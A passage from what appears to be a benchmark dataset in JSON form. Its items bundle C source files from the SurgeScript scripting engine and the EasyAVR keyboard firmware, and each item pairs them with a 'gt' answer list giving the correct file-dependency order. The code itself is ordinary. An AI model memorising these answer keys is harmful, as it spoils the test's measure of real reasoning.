time_limit)\n{\n#define show_time_limit_error() \\\n    fprintf(stderr, \"Time limit of %d seconds exceeded.\\n\", time_limit)\n\n#if !ENABLE_THREADS\n\n    uint64_t start_time = surgescript_util_gettickcount();\n    uint64_t end_time = start_time + (uint64_t)time_limit * 1000;\n\n\n    while(surgescript_vm_update(vm)) {\n\n\n        if(surgescript_util_gettickcount() > end_time) {\n            show_time_limit_error();\n            break;\n        }\n\n    }\n\n#else\n\n\n    struct timespec ts;\n    timespec_get(&ts, TIME_UTC);\n    ts.tv_sec += time_limit;\n    time_t limit = ts.tv_sec;\n\n    quit = stop = false;\n    mtx_init(&mutex, mtx_timed);\n    cnd_init(&cond);\n\n\n    thrd_t thread;\n    thrd_create(&thread, main_loop, vm);\n\n\n    mtx_lock(&mutex);\n    while(!quit && !timeout(limit))\n        cnd_timedwait(&cond, &mutex, &ts);\n    mtx_unlock(&mutex);\n\n\n    if(timeout(limit)) {\n        show_time_limit_error();\n\n\n        mtx_lock(&mutex);\n        stop = true;\n        mtx_unlock(&mutex);\n        thrd_join(thread, NULL);\n    }\n\n\n    cnd_destroy(&cond);\n    mtx_destroy(&mutex);\n\n#endif\n\n#undef show_time_limit_error\n}\n\n\nvoid destroy_vm(surgescript_vm_t* vm)\n{\n    surgescript_vm_destroy(vm);\n}\n\n#if ENABLE_THREADS\n\n\nint main_loop(void* arg)\n{\n    surgescript_vm_t* vm = (surgescript_vm_t*)arg;\n    bool end = false;\n\n    while(!end && surgescript_vm_update(vm)) {\n        mtx_lock(&mutex);\n        end = stop;\n        mtx_unlock(&mutex);\n\n        thrd_yield();\n    }\n\n    mtx_lock(&mutex);\n    quit = true;\n    cnd_broadcast(&cond);\n    mtx_unlock(&mutex);\n\n    return 0;\n}\n\n\nbool timeout(time_t limit)\n{\n    struct timespec ts;\n    timespec_get(&ts, TIME_UTC);\n    return ts.tv_sec > limit;\n}\n\n#endif\n\n\nsurgescript_vm_t* make_vm(int argc, char** argv, int* time_limit)\n{\n    surgescript_vm_t* vm = NULL;\n    int i;\n\n\n    surgescript_util_set_error_functions(discard, crash);\n\n\n    for(i = 1; i < argc && *argv[i] == '-'; i++) {\n        const char* arg = argv[i];\n        if(strcmp(arg, \"--debug\") == 0 || strcmp(arg, \"-D\") == 0) {\n\n            surgescript_util_set_error_functions(print, crash);\n        }\n        else if(strcmp(arg, \"--version\") == 0 || strcmp(arg, \"-v\") == 0) {\n\n            printf(\"%s\\n\", surgescript_util_version());\n            return NULL;\n        }\n        else if(strcmp(arg, \"--help\") == 0 || strcmp(arg, \"-h\") == 0) {\n\n            show_help(surgescript_util_basename(argv[0]));\n            return NULL;\n        }\n        else if(strcmp(arg, \"--timelimit\") == 0 || strcmp(arg, \"-t\") == 0) {\n\n            if(++i < argc && time_limit != NULL) {\n                int seconds = atoi(argv[i]);\n                *time_limit = (seconds > 0) ? seconds : INT_MAX;\n            }\n        }\n        else if(strcmp(arg, \"--\") == 0) {\n\n            break;\n        }\n        else {\n\n            fprintf(stderr, \"Unrecognized option: '%s'.\\nType '%s --help' for more information.\\n\", arg, surgescript_util_basename(argv[0]));\n            return NULL;\n        }\n    }\n\n\n    vm = surgescript_vm_create();\n\n\n    if(i < argc && strcmp(argv[i], \"--\") != 0) {\n\n        for(; i < argc && strcmp(argv[i], \"--\") != 0; i++) {\n            const char* file = argv[i];\n            surgescript_vm_compile(vm, file);\n        }\n    }\n    else {\n        fprintf(stderr, \"Reading from stdin... Run '%s -h' for help.\\n\", surgescript_util_basename(argv[0]));\n\n\n        char* code = read_from_stdin();\n        surgescript_vm_compile_code_in_memory(vm, code);\n        ssfree(code);\n    }\n\n\n    if(i < argc && strcmp(argv[i], \"--\") == 0) {\n\n        ++i;\n        surgescript_vm_launch_ex(vm, argc - i, (char**)(argv + i));\n    }\n    else {\n\n        surgescript_vm_launch(vm);\n    }\n\n\n    return vm;\n}\n\n\nvoid show_help(const char* executable)\n{\n    printf(\n        \"SurgeScript version %s\\n\"\n        \"Copyright (C) %s %s\\n\"\n        \"%s\\n\"\n        \"\\n\"\n        \"Usage: %s [OPTIONS] <scripts>\\n\"\n        \"Compiles and executes the given script(s).\\n\"\n        \"\\n\"\n        \"Options:\\n\"\n        \"    -v, --version                         shows the version of SurgeScript\\n\"\n        \"    -D, --debug                           prints debugging information\\n\"\n        \"    -t, --timelimit                       sets a maximum execution time, in seconds (0 = no limit)\\n\"\n        \"    -h, --help                            shows this message\\n\"\n        \"\\n\"\n        \"Examples:\\n\"\n        \"    %s script.ss                 compiles and executes script.ss\\n\"\n        \"    %s file1.ss file2.ss         compiles and executes file1.ss and file2.ss\\n\"\n        \"    %s --debug test.ss           compiles and runs test.ss with debugging information\\n\"\n        \"    %s file.ss -- -x -y          passes custom arguments -x and -y to file.ss\\n\"\n        \"    %s -t 5                      runs a script read from stdin, with a time limit of 5 seconds\\n\"\n        \"\\n\"\n        \"Full documentation available at: <%s>\\n\",\n        surgescript_util_version(),\n        surgescript_util_years(),\n        surgescript_util_author(),\n        surgescript_util_website(),\n        executable,\n        executable,\n        executable,\n        executable,\n        executable,\n        executable,\n        surgescript_util_website()\n    );\n}\n\n\nvoid print(const char* message)\n{\n    puts(message);\n}\n\n\nvoid crash(const char* message)\n{\n    fprintf(stderr, \"%s\\n\", message);\n    exit(1);\n}\n\n\nvoid discard(const char* message)\n{\n    ;\n}\n\n\nchar* read_from_stdin()\n{\n    const size_t BUFSIZE = 1024;\n    char* data = NULL;\n    size_t read_chars = 0, data_size = 0;\n\n\n    do {\n        data_size += BUFSIZE;\n        data = ssrealloc(data, data_size + 1);\n        read_chars += fread(data + read_chars, sizeof(char), BUFSIZE, stdin);\n        data[read_chars] = '\\0';\n    } while(read_chars == data_size);\n\n\n    return data;\n}\n\n'surgescript/src/surgescript.h'\n:\n\n#ifndef _SURGESCRIPT_H\n#define _SURGESCRIPT_H\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include \"surgescript/runtime/vm.h\"\n#include \"surgescript/runtime/program.h\"\n#include \"surgescript/runtime/object.h\"\n#include \"surgescript/runtime/program_pool.h\"\n#include \"surgescript/runtime/object_manager.h\"\n#include \"surgescript/runtime/tag_system.h\"\n#include \"surgescript/runtime/vm_time.h\"\n#include \"surgescript/runtime/heap.h\"\n#include \"surgescript/runtime/stack.h\"\n#include \"surgescript/runtime/variable.h\"\n#include \"surgescript/compiler/parser.h\"\n#include \"surgescript/util/transform.h\"\n#include \"surgescript/util/ssarray.h\"\n#include \"surgescript/util/util.h\"\n#include \"surgescript/util/version.h\"\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'surgescript/src/surgescript/runtime/vm.h'\n:\n\n#ifndef _SURGESCRIPT_RUNTIME_VM_H\n#define _SURGESCRIPT_RUNTIME_VM_H\n\n#include <stdint.h>\n#include <stdbool.h>\n#include \"program.h\"\n#include \"object.h\"\n\n\ntypedef struct surgescript_vm_t surgescript_vm_t;\nstruct surgescript_parser_t;\nstruct surgescript_programpool_t;\nstruct surgescript_objectmanager_t;\nstruct surgescript_tagsystem_t;\nstruct surgescript_vmargs_t;\nstruct surgescript_vmtime_t;\n\n\nsurgescript_vm_t* surgescript_vm_create();\nsurgescript_vm_t* surgescript_vm_destroy(surgescript_vm_t* vm);\n\n\nbool surgescript_vm_compile(surgescript_vm_t* vm, const char* absolute_path);\nbool surgescript_vm_compile_code_in_memory(surgescript_vm_t* vm, const char* code);\nbool surgescript_vm_compile_virtual_file(surgescript_vm_t* vm, const char* code, const char* filename);\n\n\nbool surgescript_vm_is_active(surgescript_vm_t* vm);\nvoid surgescript_vm_launch(surgescript_vm_t* vm);\nvoid surgescript_vm_launch_ex(surgescript_vm_t* vm, int argc, char** argv);\nvoid surgescript_vm_terminate(surgescript_vm_t* vm);\nbool surgescript_vm_reset(surgescript_vm_t* vm);\nbool surgescript_vm_update(surgescript_vm_t* vm);\nbool surgescript_vm_update_ex(surgescript_vm_t* vm, void* user_data, void (*user_update)(surgescript_object_t*,void*), void (*late_update)(surgescript_object_t*,void*));\nvoid surgescript_vm_pause(surgescript_vm_t* vm);\nvoid surgescript_vm_resume(surgescript_vm_t* vm);\nbool surgescript_vm_is_paused(const surgescript_vm_t* vm);\n\n\nstruct surgescript_programpool_t* surgescript_vm_programpool(const surgescript_vm_t* vm);\nstruct surgescript_tagsystem_t* surgescript_vm_tagsystem(const surgescript_vm_t* vm);\nstruct surgescript_objectmanager_t* surgescript_vm_objectmanager(const surgescript_vm_t* vm);\nstruct surgescript_parser_t* surgescript_vm_parser(const surgescript_vm_t* vm);\nconst struct surgescript_vmargs_t* surgescript_vm_args(const surgescript_vm_t* vm);\nconst struct surgescript_vmtime_t* surgescript_vm_time(const surgescript_vm_t* vm);\n\n\nsurgescript_object_t* surgescript_vm_root_object(surgescript_vm_t* vm);\nsurgescript_object_t* surgescript_vm_spawn_object(surgescript_vm_t* vm, surgescript_object_t* parent, const char* object_name, void* user_data);\nsurgescript_object_t* surgescript_vm_find_object(surgescript_vm_t* vm, const char* object_name);\nvoid surgescript_vm_bind(surgescript_vm_t* vm, const char* object_name, const char* fun_name, surgescript_program_cfunction_t cfun, int num_params);\nvoid surgescript_vm_install_plugin(surgescript_vm_t* vm, const char* object_name);\n\n#endif\n\n'surgescript/src/surgescript/runtime/program_operators.h'\n:\n\n#ifndef _SURGESCRIPT_RUNTIME_PROGRAM_OPERATORS_H\n#define _SURGESCRIPT_RUNTIME_PROGRAM_OPERATORS_H\n\n\n#define SURGESCRIPT_PROGRAM_OPERATORS(F) \\\n    F( SSOP_NOP, \"nop\" )                                  \\\n    F( SSOP_SELF, \"self\" )                       \\\n    F( SSOP_STATE, \"state\" )    \\\n    F( SSOP_CALLER, \"caller\" )      \\\n                                                                            \\\n    F( SSOP_MOV, \"mov\" )                                   \\\n    F( SSOP_MOVN, \"movn\" )                                 \\\n    F( SSOP_MOVB, \"movb\" )                              \\\n    F( SSOP_MOVF, \"movf\" )                            \\\n    F( SSOP_MOVS, \"movs\" )                              \\\n    F( SSOP_MOVO, \"movo\" )                            \\\n    F( SSOP_MOVX, \"movx\" )                             \\\n    F( SSOP_XCHG, \"xchg\" )                            \\\n                                                                            \\\n    F( SSOP_ALLOC, \"alloc\" )                    \\\n    F( SSOP_PEEK, \"peek\" )                                 \\\n    F( SSOP_POKE, \"poke\" )                                 \\\n                                                                            \\\n    F( SSOP_PUSH, \"push\" )                                   \\\n    F( SSOP_POP, \"pop\" )                                      \\\n    F( SSOP_SPEEK, \"speek\" )                    \\\n    F( SSOP_SPOKE, \"spoke\" )                    \\\n    F( SSOP_PUSHN, \"pushn\" )                              \\\n    F( SSOP_POPN, \"popn\" )                                 \\\n                                                                            \\\n    F( SSOP_INC, \"inc\" )                                        \\\n    F( SSOP_DEC, \"dec\" )                                        \\\n    F( SSOP_ADD, \"add\" )                                  \\\n    F( SSOP_SUB, \"sub\" )                                  \\\n    F( SSOP_MUL, \"mul\" )                                  \\\n    F( SSOP_DIV, \"div\" )                                  \\\n    F( SSOP_REM, \"rem\" )                                  \\\n    F( SSOP_NEG, \"neg\" )                                  \\\n    F( SSOP_LNOT, \"lnot\" )                                \\\n    F( SSOP_LNOT2, \"lnot2\" )                             \\\n    F( SSOP_NOT, \"not\" )                                  \\\n    F( SSOP_AND, \"and\" )                            \\\n    F( SSOP_OR, \"or\" )                              \\\n    F( SSOP_XOR, \"xor\" )                            \\\n                                                                            \\\n    F( SSOP_TEST, \"test\" )                          \\\n    F( SSOP_TCHK, \"tchk\" )                   \\\n    F( SSOP_TC01, \"tc01\" )        \\\n    F( SSOP_TCMP, \"tcmp\" )              \\\n    F( SSOP_CMP, \"cmp\" )                    \\\n                                                                            \\\n    F( SSOP_JMP, \"jmp\" )                                \\\n    F( SSOP_JE, \"je\" )                     \\\n    F( SSOP_JNE, \"jne\" )                   \\\n    F( SSOP_JG, \"jg\" )                      \\\n    F( SSOP_JGE, \"jge\" )                   \\\n    F( SSOP_JL, \"jl\" )                      \\\n    F( SSOP_JLE, \"jle\" )                   \\\n                                                                            \\\n    F( SSOP_CALL, \"call\" )                 \\\n                                          \\\n                                        \\\n                                       \\\n                                  \\\n    F( SSOP_RET, \"ret\" )                  \\\n    F( SSOP_OPTCALL, \"optcall\" )           \\\n\n\n#endif\n\n'surgescript/src/surgescript/runtime/program.h'\n:\n\n#ifndef _SURGESCRIPT_RUNTIME_PROGRAM_H\n#define _SURGESCRIPT_RUNTIME_PROGRAM_H\n\n#include <stdio.h>\n#include <stdint.h>\n#include <stdbool.h>\n#include \"renv.h\"\n#include \"program_operators.h\"\n#include \"variable.h\"\n#include \"object.h\"\n#include \"../util/util.h\"\n\n\n\n\ntypedef struct surgescript_program_t surgescript_program_t;\nstruct surgescript_program_t;\n\n\ntypedef surgescript_var_t* (*surgescript_program_cfunction_t)(surgescript_object_t*, const surgescript_var_t**, int);\n\n\ntypedef unsigned surgescript_program_label_t;\n#define SURGESCRIPT_PROGRAM_UNDEFINED_LABEL (surgescript_program_label_t)(~0u)\n\n\ntypedef enum surgescript_program_operator_t {\n    #define DECLARE_CODES(x, y) x,\n    SURGESCRIPT_PROGRAM_OPERATORS(DECLARE_CODES)\n} surgescript_program_operator_t;\n\n\ntypedef union surgescript_program_operand_t {\n    double f;\n    uint32_t u;\n    int32_t i;\n    bool b;\n    uint64_t u64;\n    int64_t i64;\n    void* p;\n} surgescript_program_operand_t;\nSS_STATIC_ASSERT(sizeof(surgescript_program_operand_t) == sizeof(uint64_t));\n\n#define SSOP()   SSOPu(0)\n#define SSOPu(x) surgescript_program_operand_u(x)\n#define SSOPf(x) surgescript_program_operand_f(x)\n#define SSOPi(x) surgescript_program_operand_i(x)\n#define SSOPb(x) surgescript_program_operand_b(x)\n#define SSOPp(x) surgescript_program_operand_p(x)\n\nstatic inline surgescript_program_operand_t surgescript_program_operand_u(unsigned u) { surgescript_program_operand_t o = { .u64 = 0 }; o.u = u; return o; }\nstatic inline surgescript_program_operand_t surgescript_program_operand_f(double f) { surgescript_program_operand_t o = { .u64 = 0 }; o.f = f; return o; }\nstatic inline surgescript_program_operand_t surgescript_program_operand_b(bool b) { surgescript_program_operand_t o = { .u64 = 0 }; o.b = b; return o; }\nstatic inline surgescript_program_operand_t surgescript_program_operand_i(int i) { surgescript_program_operand_t o = { .u64 = 0 }; o.i = i; return o; }\nstatic inline surgescript_program_operand_t surgescript_program_operand_p(void* p) { surgescript_program_operand_t o = { .u64 = 0 }; o.p = p; return o; }\n\n\n\n\n\n\n\n\n\nsurgescript_program_t* surgescript_program_create(int arity);\nsurgescript_program_t* surgescript_program_create_native(int arity, surgescript_program_cfunction_t cfunction);\nsurgescript_program_t* surgescript_program_destroy(surgescript_program_t* program);\nvoid surgescript_program_call(surgescript_program_t* program, surgescript_renv_t* runtime_environment, int num_params);\n\n\nsurgescript_program_label_t surgescript_program_new_label(surgescript_program_t* program);\nvoid surgescript_program_add_label(surgescript_program_t* program, surgescript_program_label_t label);\nint surgescript_program_add_line(surgescript_program_t* program, surgescript_program_operator_t op, surgescript_program_operand_t a, surgescript_program_operand_t b);\nint surgescript_program_chg_line(surgescript_program_t* program, int line, surgescript_program_operator_t op, surgescript_program_operand_t a, surgescript_program_operand_t b);\nbool surgescript_program_read_line(const surgescript_program_t* program, int line, surgescript_program_operator_t* op, surgescript_program_operand_t* a, surgescript_program_operand_t* b);\nint surgescript_program_count_lines(const surgescript_program_t* program);\nsurgescript_program_label_t surgescript_program_find_label(const surgescript_program_t* program, int line);\n\n\nint surgescript_program_arity(const surgescript_program_t* program);\nconst char* surgescript_program_get_text(const surgescript_program_t* program, int index);\nint surgescript_program_add_text(surgescript_program_t* program, const char* text);\nint surgescript_program_find_text(const surgescript_program_t* program, const char* text);\nint surgescript_program_text_count(const surgescript_program_t* program);\nvoid surgescript_program_dump(surgescript_program_t* program, FILE* fp);\nbool surgescript_program_is_native(const surgescript_program_t* program);\n\n#endif\n",
        "gt": [
            "'surgescript/src/surgescript/runtime/program_operators.h'",
            "'surgescript/src/surgescript/runtime/program.h'",
            "'surgescript/src/surgescript/runtime/vm.h'",
            "'surgescript/src/surgescript.h'",
            "'surgescript/src/main.c'"
        ]
    },
    {
        "files": [
            "'EasyAVR/firmware/src/scheduler.h'",
            "'EasyAVR/firmware/src/config_schedule.h'",
            "'EasyAVR/firmware/src/debug.c'"
        ],
        "content": "'EasyAVR/firmware/src/scheduler.h'\n:\n\n\n#ifndef SCHEDULER_H_\n#define SCHEDULER_H_\n\n#include <stddef.h>\n#include <stdint.h>\n#include <avr/io.h>\n\n#include \"debug.h\"\n#include \"config_schedule.h\"\n\n#define SCHEDULE_CYCLE_MS (SCHEDULE_PERIOD_MS * NUMBER_OF_SCHEDULE_SLOTS)\n#define CLOCK_KHZ (F_CPU/1000)\n\n#define SCHEDULE_CYCLE_CLOCKS (CLOCK_KHZ * SCHEDULE_PERIOD_MS)\n#define SCHEDULE_LIMIT ((SCHEDULE_CYCLE_CLOCKS * 3) / 4)\n\n\n#define TCCRA (TCCR1A)\n#define TCCRB (TCCR1B)\n#define TCCRC (TCCR1C)\n#define OCRA  (OCR1A)\n#define TCNT  (TCNT1)\n#define TIMSK (TIMSK1)\n#define OCIEA (OCIE1A)\n#define TCMAX (0xFFFF)\n\n#ifdef ENABLE_DEBUG_CONSOLE\nextern uint16_t g_schedule_clocks[NUMBER_OF_SCHEDULE_SLOTS][NUMBER_OF_ITEMS_PER_SLOT];\n#endif\n\nvoid init_scheduler(void);\nvoid schedule_start(void);\nvoid schedule_stop(void);\nvoid schedule_tick(void);\nvoid exec_slice(void);\nvoid clock_in(void);\nvoid reset_max_clocks(void);\n\n#endif\n\n'EasyAVR/firmware/src/config_schedule.h'\n:\n\n\n#ifndef CONFIG_SCHEDULE_H_\n#define CONFIG_SCHEDULE_H_\n\n\n#if defined(__AVR_ATmega32U2__) || (F_CPU == 8000000UL) || defined(BOARD_SIZE_COSTAR) || defined(BOARD_SIZE_FULLSIZE) || defined(BOARD_SIZE_JUMBO) || defined(BOARD_SIZE_SQUARE)\n#define EXPANDED_SCHEDULE\n#endif\n\n\n#if defined(__AVR_ATmega16U2__) || defined(BOARD_SIZE_CARD)\n#define SIMPLE_DEVICE\n#endif\n\n#ifdef SIMPLE_DEVICE\n#define NUMBER_OF_SCHEDULE_SLOTS 1\n#define NUMBER_OF_ITEMS_PER_SLOT 4\n#else\n#ifdef EXPANDED_SCHEDULE\n#define NUMBER_OF_SCHEDULE_SLOTS 4\n#define NUMBER_OF_ITEMS_PER_SLOT 4\n#else\n#define NUMBER_OF_SCHEDULE_SLOTS 2\n#define NUMBER_OF_ITEMS_PER_SLOT 5\n#endif\n#endif\n\n#define SCHEDULE_PERIOD_MS 1\n\nextern void (* const g_sched_list[NUMBER_OF_SCHEDULE_SLOTS][NUMBER_OF_ITEMS_PER_SLOT])(void);\n\n#endif\n\n'EasyAVR/firmware/src/debug.c'\n:\n\n#include <stddef.h>\n#include <stdint.h>\n#include <avr/pgmspace.h>\n#include <avr/io.h>\n\n#include <LUFA/Drivers/USB/USB.h>\n\n#include \"keymap.h\"\n#include \"autokey.h\"\n#include \"led.h\"\n#include \"nvm.h\"\n#include \"scheduler.h\"\n#include \"debug.h\"\n\nvolatile uint8_t g_reset_requested;\n\nconsole_state_t g_console_state;\nuint8_t g_console_index;\n\n#ifdef ENABLE_DEBUG_CONSOLE\nconst char PROGMEM g_main_menu[] = \"\\nMain Menu:\\n1) Config menu\\n2) Timing menu\\n3) LED menu\\n4) Debug menu\\n5) Reset\\n9) Quit\\n> \";\nconst char PROGMEM g_debug_menu[] = \"\\nDebug Menu:\\n1) Print events\\n2) Clear events\\n3) Examine memory\\n\"\n\t\t\t\t\t\t\t\t\t\"4) Print/clear clock-ins\\n9) Back\\n> \";\n#else\nconst char PROGMEM g_main_menu[] = \"\\nMain Menu:\\n1) Config menu\\n2) Timing menu\\n3) LED menu\\n5) Reset\\n9) Quit\\n> \";\n#endif\nconst char PROGMEM g_config_menu_begin[] = \"\\nConfig Menu:\";\nconst char PROGMEM g_timing_menu_begin[] = \"\\nTiming Menu:\";\nconst char PROGMEM g_led_menu_begin[] = \"\\nLED Menu:\";\nconst char PROGMEM g_menu_1[] = \"\\n1) \";\nconst char PROGMEM g_menu_2[] = \"\\n2) \";\nconst char PROGMEM g_menu_3[] = \"\\n3) \";\nconst char PROGMEM g_menu_4[] = \"\\n4) \";\nconst char PROGMEM g_menu_5[] = \"\\n5) \";\nconst char PROGMEM g_menu_6[] = \"\\n6) \";\nconst char PROGMEM g_menu_7[] = \"\\n7) \";\nconst char PROGMEM g_menu_8[] = \"\\n8) \";\nconst char PROGMEM g_menu_end[] = \"\\n9) Back\\n> \";\n\nconst char PROGMEM g_vnumpad_desc[] = \"Virtual Num Pad\";\nconst char PROGMEM g_vwinlock_desc[] = \"Win Lock on Scroll Lock\";\nconst char PROGMEM g_deflayer_desc[] = \"Default Layer\";\nconst char PROGMEM g_bootkb_desc[] = \"Boot Keyboard\";\nconst char PROGMEM g_vnumlock_desc[] = \"Unlinked Num Lock\";\nconst char PROGMEM g_dbstyle_desc[] = \"Alternate Debounce Style\";\nconst char PROGMEM g_debounce_desc[] = \"Debounce Time (ms)\";\nconst char PROGMEM g_tap_desc[] = \"Max Hold Time for Tap (ms)\";\nconst char PROGMEM g_doubletap_desc[] = \"Max Delay Time for Double Tap (ms)\";\nconst char PROGMEM g_mousebase_desc[] = \"Base Mouse Movement\";\nconst char PROGMEM g_mousemult_desc[] = \"Mouse Movement Multiplier\";\nconst char PROGMEM g_hold_desc[] = \"Min Hold Time for Repeat (ms)\";\nconst char PROGMEM g_repeat_desc[] = \"Repeat Period (ms)\";\nconst char PROGMEM g_setup_desc[] = \"Matrix Setup Wait (cycles)\";\nconst char PROGMEM g_defdim_desc[] = \"Default Dimmer Level\";\n#ifdef MAX_NUMBER_OF_BACKLIGHTS\nconst char PROGMEM g_defblen_desc[] = \"Default Backlight Enable\";\nconst char PROGMEM g_defblmode_desc[] = \"Default Backlight Mode\";\nconst char PROGMEM g_range_1_4[] = \" [1-4]> \";\n#endif\n\nconst char PROGMEM g_range_bool[] = \" [0=OFF, 1=ON]> \";\nconst char PROGMEM g_range_0_9[] = \" [0-9]> \";\nconst char PROGMEM g_range_1_99[] = \" [1-99]> \";\nconst char PROGMEM g_range_1_999[] = \" [1-999]> \";\nconst char PROGMEM g_range_1_255[] = \" [1-255]> \";\nconst char PROGMEM g_range_1_16[] = \" [1-16]> \";\n\nconst char PROGMEM g_on_print[] = \": ON\";\nconst char PROGMEM g_off_print[] = \": OFF\";\n\nconst char PROGMEM g_invalid_selection[] = \"Invalid selection.\\n\";\nconst char PROGMEM g_out_of_range[] = \"Out of range.\\n\";\n\nconst char PROGMEM g_event_print_1[] = \"\\n[\";\nconst char PROGMEM g_event_print_2[] = \"] C-0x\";\nconst char PROGMEM g_event_print_3[] = \" S-0x\";\nconst char PROGMEM g_exam_prompt1[] = \"Address (hex)> \";\nconst char PROGMEM g_exam_prompt2[] = \"Bytes (hex)> \";\n\n#ifdef ENABLE_DEBUG_CONSOLE\nevent_buffer_t g_event_buffer[EVENT_BUFFER_SIZE];\nuint8_t g_event_buffer_count;\nuint8_t* g_ex_ptr;\nuint8_t* g_ex_end;\n#endif\n\nvoid init_debug(void)\n{\n\n}\n\nvoid console_main(void)\n{\n\tuint16_t read_word;\n\tuint8_t read_byte;\n\tchar word_print[4];\n\n\tif (g_autokey_status == AUTOKEY_IDLE)\n\t{\n\t\tswitch (g_console_state)\n\t\t{\n\t\tdefault:\n\t\t\tg_console_state = CONSOLE_IDLE;\n\t\tcase CONSOLE_IDLE:\n\t\t\tbreak;\n\n\t\tcase CONSOLE_MENU_MAIN:\n\t\t\tqueue_autotext(g_main_menu);\n\t\t\tbegin_read();\n\t\t\tg_console_state = CONSOLE_PROCESS_MAIN;\n\t\t\tbreak;\n\t\tcase CONSOLE_PROCESS_MAIN:\n\t\t\tg_console_state = CONSOLE_MENU_MAIN;\n\t\t\tg_console_index = 0;\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tif (read_byte == 9)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_IDLE;\n\t\t\t}\n\t\t\telse if (read_byte == 5)\n\t\t\t{\n\t\t\t\tg_reset_requested = RESET_REQUESTED;\n\t\t\t}\n\t\t\telse if (read_byte == 1)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_MENU_CONFIG;\n\t\t\t}\n\t\t\telse if (read_byte == 2)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_MENU_TIMING;\n\t\t\t}\n\t\t\telse if (read_byte == 3)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_MENU_LED;\n\t\t\t}\n#ifdef ENABLE_DEBUG_CONSOLE\n\t\t\telse if (read_byte == 4)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_MENU_DEBUG;\n\t\t\t}\n#endif\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_invalid_selection);\n\t\t\t}\n\t\t\tbreak;\n\n#ifdef ENABLE_DEBUG_CONSOLE\n\t\tcase CONSOLE_MENU_DEBUG:\n\t\t\tqueue_autotext(g_debug_menu);\n\t\t\tbegin_read();\n\t\t\tg_console_state = CONSOLE_PROCESS_DEBUG;\n\t\t\tbreak;\n\t\tcase CONSOLE_PROCESS_DEBUG:\n\t\t\tg_console_state = CONSOLE_MENU_DEBUG;\n\t\t\tread_byte = sc_to_int(g_read_buffer[0]);\n\t\t\tif (read_byte == 9)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_MENU_MAIN;\n\t\t\t}\n\t\t\telse if (read_byte == 1)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_EVENTS1;\n\t\t\t}\n\t\t\telse if (read_byte == 2)\n\t\t\t{\n\t\t\t\tfor (register uint8_t i=0; i<EVENT_BUFFER_SIZE; i++)\n\t\t\t\t{\n\t\t\t\t\tg_event_buffer[i].code = 0;\n\t\t\t\t\tg_event_buffer[i].status = 0;\n\t\t\t\t}\n\t\t\t\tg_event_buffer_count = 0;\n\t\t\t}\n\t\t\telse if (read_byte == 3)\n\t\t\t{\n\t\t\t\tqueue_autotext(g_exam_prompt1);\n\t\t\t\tbegin_read();\n\t\t\t\tg_console_state = CONSOLE_EXAMINE1;\n\t\t\t}\n\t\t\telse if (read_byte == 4)\n\t\t\t{\n\t\t\t\tg_console_state = CONSOLE_CLOCKS;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tqueue_autotext(g_invalid_selection);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase CONSOLE_EVENTS1:\n\t\t\tif (g_console_index >= EVENT_BUFFER_SIZE)\n\t\t\t{\n\t\t\t\tg_console_index = 0;\n\t\t\t\tword_print[0] = '\\n';\n\t\t\t\tqueue_ram_autotext(word_print, 1);\n\t\t\t\tg_console_state = CONSOLE_MENU_DEBUG;\n\t\t\t} else {\n\t\t\t\tqueue_autotext(g_event_print_1);\n\t\t\t\tbyte_to_str(g_console_index, word_print);\n\t\t\t\tqueue_ram_autotext(word_print, 2);\n\t\t\t\tqueue_autotext(g_event_print_2);\n\t\t\t\tg_console_state = CONSOLE_EVENTS2;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase CONSOLE_EVENTS2:\n\t\t\tbyte_to_str(g_event_buffer[g_console_index].code, word_print);\n\t\t\tqueue_ram_autotext(word_print, 2);\n\t\t\tqueue_autotext(g_event_print_3);\n\t\t\tg_console_state = CONSOLE_EVENTS3;\n\t\t\tbreak;\n\t\tcase CONSOLE_EVENTS3:\n\t\t\tword_to_str(g_event_buffer[g_console_index].status, word_print);\n\t\t\tqueue_ram_autotext(word_print, sizeof(word_print));\n\t\t\tg_console_state = CONSOLE_EVENTS1;\n\t\t\tg_console_index++;\n\t\t\tbreak;\n\t\tcase CONSOLE_EXAMINE1:\n\t\t\tg_ex_ptr = (uint8_t *)sc_to_word(g_read_buffer, g_read_buffer_length, 16);\n\t\t\tg_ex_end = 0;\n\t\t\tqueue_autotext(g_exam_prompt2);\n\t\t\tbegin_read();\n\t\t\tg_console_state = CONSOLE_EXAMINE2;\n\t\t\tbreak;\n\t\tcase CONSOLE_EXAMINE2:\n\t\t\tif (!g_ex_end)\n\t\t\t\tg_ex_end = g_ex_ptr + sc_to_word(g_read_buffer, g_read_buffer_length, 16);\n\t\t\twhile(g_ex_ptr < g_ex_end)\n\t\t\t{\n\t\t\t\tbyte_to_str(*g_ex_ptr, word_print);\n\t\t\t\tif (g_ex_ptr == (g_ex_end-1))\n\t\t\t\t\tword_print[2] = '\\n';\n\t\t\t\telse\n\t\t\t\t\tword_print[2] = ' ';\n\t\t\t\tif ( queue_ram_autotext(word_print, 3) )\n\t\t\t\t\tg_ex_ptr++;\n\t\t\t\telse\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (g_ex_ptr >= g_ex_end)\n\t\t\t\tg_console_state = CONSOLE_MENU_DEBUG;\n\t\t\tbreak;\n\t\tcase CONSOLE_CLOCKS:\n\t\t\tif (g_console_index >= (NUMBER_OF_SCHEDULE_SLOTS * NUMBER_OF_ITEMS_PER_SLOT))\n\t\t\t{\n\t\t\t\tg_console_index = 0;\n\t\t\t\tword_print[0] = '\\n';\n\t\t\t\tqueue_ram_autotext(word_print, 1);\n\t\t\t\tg_console_state = CONSOLE_MENU_DEBUG;\n\t\t\t\treset_max_clocks();\n\t\t\t} else {\n\t\t\t\tregister const uint8_t i = g_console_index % NUMBER_OF_SCHEDULE_SLOTS;\n\t\t\t\tregister const uint8_t j = g_console_index / 